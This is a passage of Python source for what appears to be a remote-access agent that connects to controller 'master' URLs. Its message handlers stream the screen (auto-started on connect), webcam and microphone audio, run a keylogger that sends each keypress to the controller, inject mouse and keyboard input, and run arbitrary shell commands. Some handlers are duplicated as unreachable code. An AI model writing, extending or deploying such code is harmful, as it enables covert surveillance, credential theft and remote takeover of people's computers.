                        "country": country,
                        "country_code": country_code,
                    }))
                except Exception:
                    pass
                last_log = 0.0
                # Auto-start screen streaming for this master if enabled
                if SCREEN_AUTO_START and ws not in screen_sessions:
                    try:
                        fps = SCREEN_MAX_FPS
                        quality = SCREEN_DEFAULT_QUALITY
                        async def _loop_auto():
                            try:
                                try:
                                    import mss  # type: ignore
                                    from PIL import Image  # type: ignore
                                except Exception as e:
                                    try:
                                        await ws.send(json.dumps({"error": f"[Screen] missing deps: {e}\n"}))
                                    except Exception:
                                        pass
                                    return
                                with mss.mss() as sct:
                                    mon = sct.monitors[1]
                                    native_w, native_h = int(mon['width']), int(mon['height'])
                                    interval = 1.0 / float(fps)
                                    while screen_sessions.get(ws, {}).get("running"):
                                        t0 = time.time()
                                        raw = sct.grab(mon)
                                        img = Image.frombytes('RGB', raw.size, raw.rgb)
                                        buf = io.BytesIO()
                                        img.save(buf, format='JPEG', quality=quality, optimize=True)
                                        b64 = base64.b64encode(buf.getvalue()).decode()
                                        payload = {"type": "screen_frame", "w": native_w, "h": native_h, "ts": int(t0*1000), "data": f"data:image/jpeg;base64,{b64}"}
                                        try:
                                            await ws.send(json.dumps(payload))
                                        except Exception:
                                            break
                                        dt = time.time() - t0
                                        await asyncio.sleep(max(0.0, interval - dt))
                            finally:
                                pass
                        screen_sessions[ws] = {"running": True, "task": asyncio.create_task(_loop_auto())}
                    except Exception:
                        pass
                try:
                    while True:
                        # Exit if stop requested
                        if master_stop.get(url):
                            try:
                                await ws.close()
                            except Exception:
                                pass
                            break
                        raw = await ws.recv()
                        try:
                            data = json.loads(raw)
                        except Exception:
                            data = {"command": raw}
                        # Handle RPC-style requests first
                        if isinstance(data, dict) and data.get("type") == "stats_request":
                            req_id = data.get("request_id")
                            # Build directory listing from session-linked dir if provided, else global
                            try:
                                sid = data.get("session_id")
                            except Exception:
                                sid = None
                            if isinstance(sid, str) and sid:
                                dir_path = pane_dirs.get((ws, sid), current_agent_dir)
                            else:
                                dir_path = current_agent_dir
                            try:
                                items = []
                                for name in os.listdir(dir_path):
                                    full = os.path.join(dir_path, name)
                                    try:
                                        st = os.stat(full)
                                        items.append({
                                            "name": name,
                                            "is_dir": os.path.isdir(full),
                                            "size": int(st.st_size),
                                            "modified": int(st.st_mtime),
                                        })
                                    except Exception:
                                        items.append({"name": name, "is_dir": os.path.isdir(full)})
                                payload = {"type": "stats_response", "request_id": req_id, "data": {"current_dir": dir_path, "files": items}}
                            except Exception as e:
                                payload = {"type": "stats_response", "request_id": req_id, "error": f"Stats failed: {e}"}
                            try:
                                await ws.send(json.dumps(payload))
                            except Exception:
                                pass
                            continue
                        # Interactive session control
                        # Camera start
                        # Audio record (one-shot)
                        if isinstance(data, dict) and data.get("type") == "audio_start":
                            try:
                                dur = max(1, min(300, int(data.get("duration") or 10)))
                            except Exception:
                                dur = 10
                            await _send_line(ws, "output", f"[audio] recording {dur}s...\n")
                            try:
                                def _record_sync(seconds: int) -> str:
                                    import sounddevice as sd  # type: ignore
                                    import soundfile as sf    # type: ignore
                                    import numpy as np        # type: ignore
                                    rate = 44100
                                    channels = 1
                                    data = sd.rec(int(seconds * rate), samplerate=rate, channels=channels, dtype='int16')
                                    sd.wait()
                                    buf = io.BytesIO()
                                    sf.write(buf, data, rate, format='WAV')
                                    raw = buf.getvalue()
                                    return 'data:audio/wav;base64,' + base64.b64encode(raw).decode()
                                durl = await asyncio.to_thread(_record_sync, dur)
                                try:
                                    await ws.send(json.dumps({"type": "audio_segment", "data": durl}))
                                except Exception:
                                    pass
                                await _send_line(ws, "output", "[audio] done\n")
                            except Exception as e:
                                await _send_line(ws, "error", f"[audio] failed: {e}\n")
                            continue
                        if isinstance(data, dict) and data.get("type") == "masters_list":
                            try:
                                urls = master_urls[:]
                                st = {u: bool(master_status.get(u)) for u in urls}
                                payload = {"type":"masters_list","urls": urls, "status": st, "current": url}
                                try:
                                    await ws.send(json.dumps(payload))
                                except Exception:
                                    pass
                            except Exception:
                                pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "masters_add":
                            try:
                                u = str(data.get("url") or "").strip()
                                if u and u not in master_urls:
                                    master_urls.append(u)
                                    try:
                                        await asyncio.to_thread(_save_masters_sync, master_urls)
                                    except Exception:
                                        pass
                                    # start connector
                                    try:
                                        master_stop[u] = False
                                        master_tasks[u] = asyncio.create_task(_connect_one_master(u))
                                    except Exception:
                                        pass
                                st = {u: bool(master_status.get(u)) for u in master_urls}
                                await ws.send(json.dumps({"type":"masters_list","urls": master_urls, "status": st, "current": url}))
                            except Exception:
                                pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "masters_update":
                            try:
                                old = str(data.get("old") or "").strip()
                                new = str(data.get("new") or "").strip()
                                if old and new and old in master_urls:
                                    # stop old
                                    master_stop[old] = True
                                    try:
                                        master_urls.remove(old)
                                    except Exception:
                                        pass
                                    if new not in master_urls:
                                        master_urls.append(new)
                                        master_stop[new] = False
                                        master_tasks[new] = asyncio.create_task(_connect_one_master(new))
                                    await asyncio.to_thread(_save_masters_sync, master_urls)
                                st = {u: bool(master_status.get(u)) for u in master_urls}
                                await ws.send(json.dumps({"type":"masters_list","urls": master_urls, "status": st, "current": url}))
                            except Exception:
                                pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "masters_delete":
                            try:
                                u = str(data.get("url") or "").strip()
                                if u and u in master_urls:
                                    master_stop[u] = True
                                    try:
                                        master_urls.remove(u)
                                    except Exception:
                                        pass
                                    await asyncio.to_thread(_save_masters_sync, master_urls)
                                st = {u: bool(master_status.get(u)) for u in master_urls}
                                await ws.send(json.dumps({"type":"masters_list","urls": master_urls, "status": st, "current": url}))
                            except Exception:
                                pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "masters_reconnect":
                            try:
                                # trigger reconnects by toggling stop flags false for existing urls
                                for u in list(master_urls):
                                    master_stop[u] = False
                                    if u not in master_tasks or master_tasks[u].done():
                                        master_tasks[u] = asyncio.create_task(_connect_one_master(u))
                                st = {u: bool(master_status.get(u)) for u in master_urls}
                                await ws.send(json.dumps({"type":"masters_list","urls": master_urls, "status": st, "current": url}))
                            except Exception:
                                pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "queue_reset":
                            try:
                                # Clear queue and kill any running queued process
                                await _send_line(ws, "output", "[Queue] Reset requested\n")
                                async with queue_lock:
                                    command_queue.clear()
                                    command_running = False
                                    queue_task = None
                                    proc = queue_current_proc
                                    queue_current_proc = None
                                    queue_started_at = 0.0
                                if proc is not None:
                                    try:
                                        if os.name == 'nt':
                                            def _term():
                                                try:
                                                    proc.terminate()
                                                except Exception:
                                                    pass
                                            await asyncio.to_thread(_term)
                                        else:
                                            try:
                                                proc.terminate()
                                            except Exception:
                                                pass
                                    except Exception:
                                        pass
                                # Stop interactive/camera/screen sessions
                                try:
                                    # interactive
                                    sess = interactive_sessions.pop(ws, None)
                                    if sess:
                                        p = sess.get("proc")
                                        if p is not None:
                                            if os.name == 'nt':
                                                def _kill_i():
                                                    try:
                                                        p.terminate()
                                                    except Exception:
                                                        pass
                                                await asyncio.to_thread(_kill_i)
                                            else:
                                                try:
                                                    p.terminate()
                                                except Exception:
                                                    pass
                                    # camera
                                    c = camera_sessions.pop(ws, None)
                                    if c:
                                        try:
                                            c["running"] = False
                                            t = c.get("task");
                                            if t: t.cancel()
                                        except Exception:
                                            pass
                                    # screen
                                    s = screen_sessions.pop(ws, None)
                                    if s:
                                        try:
                                            s["running"] = False
                                            t = s.get("task");
                                            if t: t.cancel()
                                        except Exception:
                                            pass
                                except Exception:
                                    pass
                            except Exception:
                                pass
                            continue

                        if isinstance(data, dict) and data.get("type") == "hard_reset":
                            try:
                                await _send_line(ws, "output", "[Hard reset requested]\n")
                            except Exception:
                                pass
                            # Reuse queue_reset logic then close socket to force reconnect
                            try:
                                async with queue_lock:
                                    command_queue.clear()
                                    command_running = False
                                    queue_task = None
                                    proc = queue_current_proc
                                    queue_current_proc = None
                                    queue_started_at = 0.0
                                if proc is not None:
                                    try:
                                        if os.name == 'nt':
                                            def _term2():
                                                try:
                                                    proc.terminate()
                                                except Exception:
                                                    pass
                                            await asyncio.to_thread(_term2)
                                        else:
                                            try:
                                                proc.terminate()
                                            except Exception:
                                                pass
                                    except Exception:
                                        pass
                                # stop sessions
                                try:
                                    sess = interactive_sessions.pop(ws, None)
                                    if sess:
                                        p = sess.get("proc")
                                        if p is not None:
                                            if os.name == 'nt':
                                                if sess.get("pty"):
                                                    def _kill_i2():
                                                        try:
                                                            p.terminate(True)
                                                        except Exception:
                                                            pass
                                                    await asyncio.to_thread(_kill_i2)
                                                else:
                                                    def _kill_i2():
                                                        try:
                                                            p.terminate()
                                                        except Exception:
                                                            pass
                                                    await asyncio.to_thread(_kill_i2)
                                            else:
                                                try:
                                                    p.terminate()
                                                except Exception:
                                                    pass
                                    c = camera_sessions.pop(ws, None)
                                    if c:
                                        try:
                                            c["running"] = False
                                            t = c.get("task");
                                            if t: t.cancel()
                                        except Exception:
                                            pass
                                    s = screen_sessions.pop(ws, None)
                                    if s:
                                        try:
                                            s["running"] = False
                                            t = s.get("task");
                                            if t: t.cancel()
                                        except Exception:
                                            pass
                                except Exception:
                                    pass
                            except Exception:
                                pass
                            try:
                                await ws.close()
                            except Exception:
                                pass
                            continue

                        if isinstance(data, dict) and data.get("type") == "disconnect":
                            try:
                                await _send_line(ws, "output", "[Disconnect requested]\n")
                            except Exception:
                                pass
                            try:
                                await _remove_queued_for_ws(ws)
                            except Exception:
                                pass
                            try:
                                sess = interactive_sessions.pop(ws, None)
                                if sess:
                                    p = sess.get("proc")
                                    if p is not None:
                                        if os.name == 'nt':
                                            if sess.get("pty"):
                                                def _kill_di():
                                                    try:
                                                        p.terminate(True)
                                                    except Exception:
                                                        pass
                                                await asyncio.to_thread(_kill_di)
                                            else:
                                                def _kill_di():
                                                    try:
                                                        p.terminate()
                                                    except Exception:
                                                        pass
                                                await asyncio.to_thread(_kill_di)
                                        else:
                                            try:
                                                p.terminate()
                                            except Exception:
                                                pass
                                c = camera_sessions.pop(ws, None)
                                if c:
                                    c["running"] = False
                                    t = c.get("task")
                                    if t: t.cancel()
                                s = screen_sessions.pop(ws, None)
                                if s:
                                    s["running"] = False
                                    t = s.get("task")
                                    if t: t.cancel()
                            except Exception:
                                pass
                            try:
                                await ws.close()
                            except Exception:
                                pass
                            continue

                        if isinstance(data, dict) and data.get("type") == "camera_start":
                            if not CAMERA_ENABLED:
                                try:
                                    await ws.send(json.dumps({"error": "[Camera] Disabled on agent (CAMERA_ENABLED=0)\n"}))
                                except Exception:
                                    pass
                                continue
                            if ws in camera_sessions and camera_sessions[ws].get("running"):
                                try:
                                    await ws.send(json.dumps({"output": "[Camera already running]\n"}))
                                except Exception:
                                    pass
                                continue
                            fps = max(1, min(15, int(data.get("fps") or 8)))
                            quality = min(95, max(10, int(data.get("quality") or 60)))
                            target_h = int(data.get("height") or 0)
                            async def _cam_loop():
                                cap = None
                                try:
                                    try:
                                        import cv2  # type: ignore
                                    except Exception as e:
                                        try:
                                            await ws.send(json.dumps({"error": f"[Camera] missing deps: {e}\n"}))
                                        except Exception:
                                            pass
                                        return
                                    cap = await asyncio.to_thread(lambda: __import__('cv2').VideoCapture(0))
                                    if not cap or not await asyncio.to_thread(cap.isOpened):
                                        try:
                                            await ws.send(json.dumps({"error": "[Camera] Cannot open camera\n"}))
                                        except Exception:
                                            pass
                                        return
                                    interval = 1.0 / float(fps)
                                    while camera_sessions.get(ws, {}).get("running"):
                                        t0 = time.time()
                                        # Read frame
                                        ok, frame = await asyncio.to_thread(cap.read)
                                        if not ok:
                                            await asyncio.sleep(0.1)
                                            continue
                                        # Optional resize to target height
                                        try:
                                            if isinstance(target_h, int) and target_h > 0:
                                                h, w = frame.shape[:2]
                                                if h != target_h and h > 0:
                                                    tw = max(1, int(w * (target_h / float(h))))
                                                    import cv2 as _cv2  # type: ignore
                                                    frame = await asyncio.to_thread(lambda: _cv2.resize(frame, (tw, target_h)))
                                        except Exception:
                                            pass
                                        # Encode JPEG
                                        def _encode(f):
                                            import cv2
                                            import numpy as _np  # noqa
                                            params = [int(cv2.IMWRITE_JPEG_QUALITY), int(quality)]
                                            ok2, buf = cv2.imencode('.jpg', f, params)
                                            return ok2, buf
                                        ok2, buf = await asyncio.to_thread(_encode, frame)
                                        if not ok2:
                                            await asyncio.sleep(0.05)
                                            continue
                                        b64 = base64.b64encode(buf.tobytes()).decode()
                                        h, w = frame.shape[:2]
                                        payload = {"type": "camera_frame", "w": int(w), "h": int(h), "ts": int(t0*1000), "data": f"data:image/jpeg;base64,{b64}"}
                                        try:
                                            await ws.send(json.dumps(payload))
                                        except Exception:
                                            break
                                        dt = time.time() - t0
                                        await asyncio.sleep(max(0.0, interval - dt))
                                except Exception:
                                    pass
                                finally:
                                    try:
                                        if cap is not None:
                                            await asyncio.to_thread(cap.release)
                                    except Exception:
                                        pass
                            camera_sessions[ws] = {"running": True, "task": asyncio.create_task(_cam_loop())}
                            continue
                            if not CAMERA_ENABLED:
                                try:
                                    await ws.send(json.dumps({"error": "[Camera] Disabled on agent (CAMERA_ENABLED=0)\n"}))
                                except Exception:
                                    pass
                                continue
                            if ws in camera_sessions and camera_sessions[ws].get("running"):
                                try:
                                    await ws.send(json.dumps({"output": "[Camera already running]\n"}))
                                except Exception:
                                    pass
                                continue
                            fps = max(1, min(15, int(data.get("fps") or 8)))
                            quality = min(95, max(10, int(data.get("quality") or 60)))
                            async def _cam_loop():
                                cap = None
                                try:
                                    try:
                                        import cv2  # type: ignore
                                    except Exception as e:
                                        try:
                                            await ws.send(json.dumps({"error": f"[Camera] missing deps: {e}\n"}))
                                        except Exception:
                                            pass
                                        return
                                    cap = await asyncio.to_thread(lambda: __import__('cv2').VideoCapture(0))
                                    if not cap or not await asyncio.to_thread(cap.isOpened):
                                        try:
                                            await ws.send(json.dumps({"error": "[Camera] Cannot open camera\n"}))
                                        except Exception:
                                            pass
                                        return
                                    interval = 1.0 / float(fps)
                                    while camera_sessions.get(ws, {}).get("running"):
                                        t0 = time.time()
                                        # Read frame
                                        ok, frame = await asyncio.to_thread(cap.read)
                                        if not ok:
                                            await asyncio.sleep(0.1)
                                            continue
                                        # Encode JPEG
                                        def _encode(f):
                                            import cv2
                                            import numpy as _np  # noqa
                                            params = [int(cv2.IMWRITE_JPEG_QUALITY), int(quality)]
                                            ok2, buf = cv2.imencode('.jpg', f, params)
                                            return ok2, buf
                                        ok2, buf = await asyncio.to_thread(_encode, frame)
                                        if not ok2:
                                            await asyncio.sleep(0.05)
                                            continue
                                        b64 = base64.b64encode(buf.tobytes()).decode()
                                        h, w = frame.shape[:2]
                                        payload = {"type": "camera_frame", "w": int(w), "h": int(h), "ts": int(t0*1000), "data": f"data:image/jpeg;base64,{b64}"}
                                        try:
                                            await ws.send(json.dumps(payload))
                                        except Exception:
                                            break
                                        dt = time.time() - t0
                                        await asyncio.sleep(max(0.0, interval - dt))
                                except Exception:
                                    pass
                                finally:
                                    try:
                                        if cap is not None:
                                            await asyncio.to_thread(cap.release)
                                    except Exception:
                                        pass
                            camera_sessions[ws] = {"running": True, "task": asyncio.create_task(_cam_loop())}
                            continue
                        if isinstance(data, dict) and data.get("type") == "camera_stop":
                            sessc = camera_sessions.pop(ws, None)
                            if sessc:
                                sessc["running"] = False
                                try:
                                    t = sessc.get("task")
                                    if t: t.cancel()
                                except Exception:
                                    pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "screen_start":
                            # Start screen capture session (view-only)
                            if ws in screen_sessions:
                                try:
                                    await ws.send(json.dumps({"output": "[Screen already running]\n"}))
                                except Exception:
                                    pass
                                continue
                            fps = max(1, min(SCREEN_MAX_FPS, int(data.get("fps") or SCREEN_MAX_FPS)))
                            quality = min(95, max(10, int(data.get("quality") or SCREEN_DEFAULT_QUALITY)))
                            target_h = int(data.get("height") or 0)
                            async def _loop():
                                try:
                                    try:
                                        import mss  # type: ignore
                                        from PIL import Image  # type: ignore
                                    except Exception as e:
                                        try:
                                            await ws.send(json.dumps({"error": f"[Screen] missing deps: {e}\n"}))
                                        except Exception:
                                            pass
                                        return
                                    with mss.mss() as sct:
                                        mon = sct.monitors[1]
                                        native_w, native_h = int(mon['width']), int(mon['height'])
                                        interval = 1.0 / float(fps)
                                        while screen_sessions.get(ws, {}).get("running"):
                                            t0 = time.time()
                                            raw = sct.grab(mon)
                                            img = Image.frombytes('RGB', raw.size, raw.rgb)
                                            # Optional down/up-scale to requested height
                                            send_img = img
                                            if isinstance(target_h, int) and target_h > 0 and native_h > 0 and target_h != native_h:
                                                tw = max(1, int(native_w * (target_h / float(native_h))))
                                                try:
                                                    send_img = img.resize((tw, target_h))
                                                except Exception:
                                                    send_img = img
                                            buf = io.BytesIO()
                                            send_img.save(buf, format='JPEG', quality=quality, optimize=True)
                                            b64 = base64.b64encode(buf.getvalue()).decode()
                                            payload = {"type": "screen_frame", "w": native_w, "h": native_h, "ts": int(t0*1000), "data": f"data:image/jpeg;base64,{b64}"}
                                            try:
                                                await ws.send(json.dumps(payload))
                                            except Exception:
                                                break
                                            dt = time.time() - t0
                                            await asyncio.sleep(max(0.0, interval - dt))
                                finally:
                                    pass
                            screen_sessions[ws] = {"running": True, "task": asyncio.create_task(_loop())}
                            continue
                            # Start screen capture session (view-only)
                            if ws in screen_sessions:
                                try:
                                    await ws.send(json.dumps({"output": "[Screen already running]\n"}))
                                except Exception:
                                    pass
                                continue
                            fps = max(1, min(SCREEN_MAX_FPS, int(data.get("fps") or SCREEN_MAX_FPS)))
                            quality = min(95, max(10, int(data.get("quality") or SCREEN_DEFAULT_QUALITY)))
                            async def _loop():
                                try:
                                    try:
                                        import mss  # type: ignore
                                        from PIL import Image  # type: ignore
                                    except Exception as e:
                                        try:
                                            await ws.send(json.dumps({"error": f"[Screen] missing deps: {e}\n"}))
                                        except Exception:
                                            pass
                                        return
                                    with mss.mss() as sct:
                                        mon = sct.monitors[1]
                                        native_w, native_h = int(mon['width']), int(mon['height'])
                                        interval = 1.0 / float(fps)
                                        last = 0.0
                                        while screen_sessions.get(ws, {}).get("running"):
                                            t0 = time.time()
                                            raw = sct.grab(mon)
                                            img = Image.frombytes('RGB', raw.size, raw.rgb)
                                            buf = io.BytesIO()
                                            img.save(buf, format='JPEG', quality=quality, optimize=True)
                                            b64 = base64.b64encode(buf.getvalue()).decode()
                                            payload = {"type": "screen_frame", "w": native_w, "h": native_h, "ts": int(t0*1000), "data": f"data:image/jpeg;base64,{b64}"}
                                            try:
                                                await ws.send(json.dumps(payload))
                                            except Exception:
                                                break
                                            dt = time.time() - t0
                                            await asyncio.sleep(max(0.0, interval - dt))
                                finally:
                                    pass
                            screen_sessions[ws] = {"running": True, "task": asyncio.create_task(_loop())}
                            continue
                        if isinstance(data, dict) and data.get("type") == "screen_stop":
                            sess = screen_sessions.pop(ws, None)
                            if sess:
                                sess["running"] = False
                                try:
                                    t = sess.get("task")
                                    if t: t.cancel()
                                except Exception:
                                    pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "start_interactive":
                            if ws in interactive_sessions:
                                try:
                                    await ws.send(json.dumps({"output": "[Interactive already running]\n"}))
                                except Exception:
                                    pass
                                continue
                            # Clear queued commands for this dashboard to avoid interference
                            try:
                                await _remove_queued_for_ws(ws)
                            except Exception:
                                pass
                            start_cmd = data.get("command") or ""
                            if not start_cmd.strip():
                                try:
                                    await ws.send(json.dumps({"error": "No command specified for interactive session\n"}))
                                except Exception:
                                    pass
                                continue
                            # Start interactive process
                            env_final = os.environ.copy()
                            env_final["PYTHONUNBUFFERED"] = "1"
                            env_final["PYTHONIOENCODING"] = "utf-8"
                            # Ensure python interactive commands are unbuffered
                            try:
                                parts_si = (start_cmd or "").strip().split()
                                if parts_si and parts_si[0].lower() in ("python","python3","py") and "-u" not in parts_si:
                                    parts_si.insert(1, "-u")
                                    start_cmd = " ".join(parts_si)
                            except Exception:
                                pass
                            if os.name == "nt":
                                # Prefer ConPTY via pywinpty on Windows for true TTY prompts
                                use_pty = False
                                try:
                                    import pywinpty  # type: ignore
                                    from pywinpty import PtyProcess  # type: ignore
                                    use_pty = True
                                except Exception:
                                    use_pty = False
                                if use_pty:
                                    def start_pty():
                                        return PtyProcess.spawn(start_cmd, cwd=current_agent_dir, env=env_final)
                                    proc = await asyncio.to_thread(start_pty)
                                    # Replace stdout/stderr readers with PTY reader
                                    loop = asyncio.get_running_loop()
                                    q: asyncio.Queue[tuple[str, str]] = asyncio.Queue()
                                    async def pty_reader():
                                        try:
                                            while True:
                                                ch = await asyncio.to_thread(proc.read, 1)
                                                if not ch:
                                                    break
                                                await q.put(("output", ch))
                                        except Exception:
                                            pass
                                        finally:
                                            await q.put(("__done__", "pty"))
                                    tasks = [asyncio.create_task(pty_reader())]
                                    interactive_sessions[ws] = {"proc": proc, "queue": q, "tasks": tasks, "pty": True}
                                    try:
                                        await ws.send(json.dumps({"output": "[Interactive session started]\n"}))
                                    except Exception:
                                        pass
                                    continue
                                # Fallback: spawn process directly
                                cmd_list = None
                                try:
                                    parts = shlex.split(start_cmd, posix=False)
                                    if parts and parts[0].lower() in ("python","python3","py"):
                                        cmd_list = parts
                                except Exception:
                                    cmd_list = None
                                def start_proc():
                                    if cmd_list:
                                        return subprocess.Popen(
                                            cmd_list,
                                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                            text=True, encoding="utf-8", errors="replace", bufsize=1,
                                            cwd=current_agent_dir, env=env_final)
                                    return subprocess.Popen([
                                        "cmd.exe","/c", start_cmd
                                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                    text=True, encoding="utf-8", errors="replace", bufsize=1,
                                    cwd=current_agent_dir, env=env_final)
                                proc = await asyncio.to_thread(start_proc)
                            else:
                                proc = await asyncio.create_subprocess_shell(
                                    start_cmd,
                                    stdout=asyncio.subprocess.PIPE,
                                    stderr=asyncio.subprocess.PIPE,
                                    stdin=asyncio.subprocess.PIPE,
                                    cwd=current_agent_dir,
                                    env=env_final,
                                )
                            # Readers (character-by-character to capture prompts without trailing newlines)
                            loop = asyncio.get_running_loop()
                            q: asyncio.Queue[tuple[str, str]] = asyncio.Queue()
                            def reader_stream_chars(stream, key):
                                try:
                                    while True:
                                        ch = stream.read(1)
                                        if not ch:
                                            break
                                        loop.call_soon_threadsafe(q.put_nowait, (key, ch))
                                except Exception as e:
                                    loop.call_soon_threadsafe(q.put_nowait, ("error", f"[reader {key} failed: {e}\n]"))
                                finally:
                                    loop.call_soon_threadsafe(q.put_nowait, ("__done__", key))
                            tasks = []
                            if os.name == 'nt':
                                tasks.append(asyncio.create_task(asyncio.to_thread(reader_stream_chars, proc.stdout, "output")))
                                tasks.append(asyncio.create_task(asyncio.to_thread(reader_stream_chars, proc.stderr, "error")))
                            else:
                                async def stream_reader_chars(stream, key):
                                    try:
                                        while True:
                                            chunk = await stream.read(1)
                                            if not chunk:
                                                break
                                            text = chunk.decode(errors="replace")
                                            await q.put((key, text))
                                    except Exception:
                                        pass
                                    finally:
                                        await q.put(("__done__", key))
                                tasks.append(asyncio.create_task(stream_reader_chars(proc.stdout, "output")))
                                tasks.append(asyncio.create_task(stream_reader_chars(proc.stderr, "error")))
                            interactive_sessions[ws] = {"proc": proc, "queue": q, "tasks": tasks}
                            # Pump queued output to master continuously so prompts show immediately
                            async def _pump():
                                try:
                                    while True:
                                        sess_i = interactive_sessions.get(ws)
                                        if not sess_i:
                                            return
                                        qq: asyncio.Queue = sess_i.get("queue")
                                        drained = False
                                        while True:
                                            try:
                                                item = qq.get_nowait()
                                            except asyncio.QueueEmpty:
                                                break
                                            else:
                                                drained = True
                                                key, payload = item
                                                if key != "__done__":
                                                    try:
                                                        await ws.send(json.dumps({key: payload}))
                                                    except Exception:
                                                        return
                                        # check process exit
                                        code = None
                                        try:
                                            p = sess_i.get("proc")
                                            if os.name == 'nt' and sess_i.get("pty"):
                                                alive = await asyncio.to_thread(p.isalive)
                                                if not alive:
                                                    code = await asyncio.to_thread(lambda: getattr(p, 'exitstatus', 0))
                                            elif os.name == 'nt':
                                                code = await asyncio.to_thread(p.poll)
                                            else:
                                                code = p.returncode
                                        except Exception:
                                            code = None
                                        if code is not None:
                                            try:
                                                await ws.send(json.dumps({"exit_code": int(code)}))
                                            except Exception:
                                                pass
                                            # cleanup tasks
                                            for t in sess_i.get("tasks", []):
                                                try:
                                                    t.cancel()
                                                except Exception:
                                                    pass
                                            interactive_sessions.pop(ws, None)
                                            return
                                        if not drained:
                                            await asyncio.sleep(0.05)
                                except Exception:
                                    pass
                            pump_task = asyncio.create_task(_pump())
                            interactive_sessions[ws]["pump"] = pump_task
                            try:
                                await ws.send(json.dumps({"output": "[Interactive session started]\\n"}))
                            except Exception:
                                pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "keylog_start":
                            try:
                                loop = asyncio.get_running_loop()
                                try:
                                    from pynput import keyboard as _kbd  # type: ignore
                                except Exception as e:
                                    try:
                                        await ws.send(json.dumps({"error": f"[Keylog] missing deps: {e}\n"}))
                                    except Exception:
                                        pass
                                    continue
                                if ws in keylog_sessions:
                                    try:
                                        await ws.send(json.dumps({"output": "[Keylog already running]\n"}))
                                    except Exception:
                                        pass
                                    continue
                                def _on_press(key):
                                    try:
                                        s = str(key)
                                        loop.call_soon_threadsafe(asyncio.create_task, ws.send(json.dumps({"type":"keylog_line","line": s})))
                                    except Exception:
                                        pass
                                def _on_release(key):
                                    # no-op; could send on release too
                                    pass
                                listener = _kbd.Listener(on_press=_on_press, on_release=_on_release)
                                await asyncio.to_thread(listener.start)
                                keylog_sessions[ws] = listener
                                try:
                                    await ws.send(json.dumps({"output": "[Keylog started]\n"}))
                                except Exception:
                                    pass
                            except Exception:
                                pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "keylog_stop":
                            try:
                                l = keylog_sessions.pop(ws, None)
                                if l:
                                    try:
                                        await asyncio.to_thread(l.stop)
                                    except Exception:
                                        pass
                                try:
                                    await ws.send(json.dumps({"output": "[Keylog stopped]\n"}))
                                except Exception:
                                    pass
                            except Exception:
                                pass
                            continue

                        if isinstance(data, dict) and data.get("type") == "mouse":
                            # Remote mouse events (optional)
                            if REMOTE_CONTROL_ENABLED:
                                try:
                                    from pynput.mouse import Controller as MouseController, Button as MouseButton  # type: ignore
                                    m = MouseController()
                                    action = (data.get("action") or '').lower()
                                    if action == 'move':
                                        x, y = int(data.get('x') or 0), int(data.get('y') or 0)
                                        m.position = (x, y)
                                    elif action in ('click','down','up'):
                                        x, y = int(data.get('x') or 0), int(data.get('y') or 0)
                                        m.position = (x, y)
                                        btn = MouseButton.left if (data.get('button') or 'left').lower()=='left' else MouseButton.right
                                        if action == 'click':
                                            m.click(btn, 1)
                                        elif action == 'down':
                                            m.press(btn)
                                        else:
                                            m.release(btn)
                                    elif action == 'scroll':
                                        dx, dy = int(data.get('dx') or 0), int(data.get('dy') or 0)
                                        m.scroll(dx, dy)
                                except Exception:
                                    pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "keyboard":
                            if REMOTE_CONTROL_ENABLED:
                                try:
                                    from pynput.keyboard import Controller as KeyboardController, Key, KeyCode  # type: ignore
                                    kbd = KeyboardController()
                                    # Text typing
                                    txt = data.get('text')
                                    if isinstance(txt, str) and txt:
                                        kbd.type(txt)
                                    # Key press/release
                                    action = (data.get('action') or '').lower()
                                    key_name = data.get('key')
                                    if action in ('down','up') and isinstance(key_name, str) and key_name:
                                        name = key_name.lower()
                                        special = {
                                            'enter': Key.enter,
                                            'return': Key.enter,
                                            'backspace': Key.backspace,
                                            'tab': Key.tab,
                                            'esc': Key.esc,
                                            'escape': Key.esc,
                                            'space': Key.space,
                                            'shift': Key.shift,
                                            'ctrl': Key.ctrl,
                                            'control': Key.ctrl,
                                            'alt': Key.alt,
                                            'win': Key.cmd if os.name == 'nt' else Key.cmd,
                                            'meta': Key.cmd,
                                            'left': Key.left,
                                            'right': Key.right,
                                            'up': Key.up,
                                            'down': Key.down,
                                            'delete': Key.delete,
                                            'home': Key.home,
                                            'end': Key.end,
                                            'pageup': Key.page_up,
                                            'pagedown': Key.page_down,
                                        }
                                        if name.startswith('f') and name[1:].isdigit():
                                            try:
                                                idx = int(name[1:])
                                                if 1 <= idx <= 20:
                                                    special[name] = getattr(Key, name)
                                            except Exception:
                                                pass
                                        key_obj = special.get(name) or (KeyCode.from_char(key_name) if len(key_name) == 1 else None)
                                        if key_obj is not None:
                                            if action == 'down':
                                                kbd.press(key_obj)
                                            else:
                                                kbd.release(key_obj)
                                except Exception:
                                    pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "stdin":
                            sess = interactive_sessions.get(ws)
                            if not sess:
                                continue
                            proc = sess.get("proc")
                            try:
                                payload = data.get("data", "")
                                if os.name == 'nt':
                                    if sess.get("pty"):
                                        def write_pty():
                                            try:
                                                txt = payload
                                                if not txt.endswith("\n"):
                                                    txt += "\r\n"
                                                proc.write(txt)
                                            except Exception:
                                                pass
                                        await asyncio.to_thread(write_pty)
                                    else:
                                        def write_stdin():
                                            try:
                                                proc.stdin.write(payload)
                                                if not payload.endswith("\n"):
                                                    proc.stdin.write("\n")
                                                proc.stdin.flush()
                                            except Exception:
                                                pass
                                        await asyncio.to_thread(write_stdin)
                                else:
                                    if not payload.endswith("\n"):
                                        payload += "\n"
                                    proc.stdin.write(payload.encode())
                                    await proc.stdin.drain()
                            except Exception:
                                pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "end_interactive":
                            sess = interactive_sessions.pop(ws, None)
                            if sess:
                                proc = sess.get("proc")
                                try:
                                    if os.name == 'nt':
                                        if sess.get("pty"):
                                            def _termpty():
                                                try:
